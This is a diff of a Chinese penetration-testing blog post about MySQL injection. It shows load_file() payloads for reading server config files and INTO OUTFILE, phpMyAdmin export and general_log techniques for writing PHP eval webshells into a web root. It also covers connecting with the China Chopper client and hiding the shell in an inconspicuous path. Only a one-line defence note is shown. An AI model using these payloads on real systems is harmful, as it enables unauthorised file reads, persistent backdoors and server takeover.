@@ -2,7 +2,7 @@
 date = "2016-06-20T08:10:27+08:00"
 description = ""
 draft = false
-tags = ["injection"]
+tags = ["injection", "getshell"]
 title = "SQL注入之load_file和into outfile(MySQL)"
 topics = ["Pentest"]
 
@@ -11,10 +11,10 @@ topics = ["Pentest"]
  * @Author: reber
  * @Mail: reber0ask@qq.com
  * @Date: 2019-04-10 10:45:00
- * @LastEditTime: 2019-08-15 15:19:43
+ * @LastEditTime : 2020-04-29 16:58:30
  -->
 
-### 0x00 load_file()
+### 0x00 load_file() 读文件
 * 条件:
 
 ```
@@ -41,7 +41,7 @@ topics = ["Pentest"]
     ?id=1' union select 1,2,load_file('/site/xxx.com/conf/conn.inc.php')
     ```
 
-### 0x01 into outfile
+### 0x01 into outfile getshell
 * 条件：
 
 ```
@@ -55,30 +55,44 @@ topics = ["Pentest"]
 * 一般方法  
 当知道路径时，可以直接用
 
-```id=1 union select "<? phpinfo();>" into outfile("C:/phpStudy/WWW/a.php")```
+```
+id=1 union select "<? phpinfo();>" into outfile("C:/phpStudy/WWW/a.php")
 
-或者
+id=1 into outfile 'C:/phpStudy/WWW/a.php' columns terminated by '<? phpinfo();>';
+id=1 into outfile 'C:/phpStudy/WWW/a.php' fields terminated by '<? phpinfo();>';
+id=1 into outfile 'C:/phpStudy/WWW/a.php' lines terminated by '<? phpinfo();>';
+id=1 into outfile 'C:/phpStudy/WWW/a.php' lines starting by '<? phpinfo();>';
+```
 
-```id=1 into outfile 'C:/phpStudy/WWW/a.php' fields terminated by '<? phpinfo();>';```
+* phpMyAdmin 导出数据 getshell 
 
-* 其他方法 
-    * 登陆phpMyAdmin  
-    ```
-    use test;  选择数据库为test
-    create table aaa(bbb varchar(64));   在数据库中创建一个表aaa
-    insert into aaa values("<?php @eval($_POST['c']);?>"); --在aaa中插入一条数据<?php @eval($_POST['c']);?>
-    select * from aaa into outfile 'C:/phpStudy/WWW/a.php'; --将aaa中的数据导出到文件a.php
-    ```
+登陆phpMyAdmin  
+```
+use test;  选择数据库为test
+create table aaa(bbb varchar(64));   在数据库中创建一个表aaa
+insert into aaa values("<?php @eval($_POST['c']);?>"); --在 aaa 中写入 shell 内容
+select * from aaa into outfile 'C:/phpStudy/WWW/a.php'; --将 aaa 中的数据导出到文件 a.php
+```
 
-    * localhost:80/a.php能访问  
-    ```
-    drop aaa; --删除建立的表
-    ```
+localhost:80/a.php能访问  
+```
+drop aaa; --删除建立的表
+```
 
-    * 然后菜刀连接  
-    ```ini
-    菜刀连接http://www.aa.com/a.php，然后更改shell的名字并将shell放在较隐蔽的地方，比如C:\phpStudy\WWW\phpMyAdmin\setup\lib\common.php
-    ```
+然后菜刀连接  
+```ini
+菜刀连接http://www.aa.com/a.php，然后更改shell的名字并将shell放在较隐蔽的地方，比如C:\phpStudy\WWW\phpMyAdmin\setup\lib\common.php
+```
+
+* phpMyAdmin 日志 getshell
+
+```
+show variables like '%general%';             #查看配置
+set global general_log = on;                 #开启general log模式
+set global general_log_file = 'C:/phpStudy/WWW/a.php'; #设置日志目录为shell地址
+select '<?php eval($_GET[g]);?>'             #写入shell
+set global general_log=off;                  #关闭general log模式
+```
 
 ### 0x02 防御
 * 数据库连接账号不要用root权限
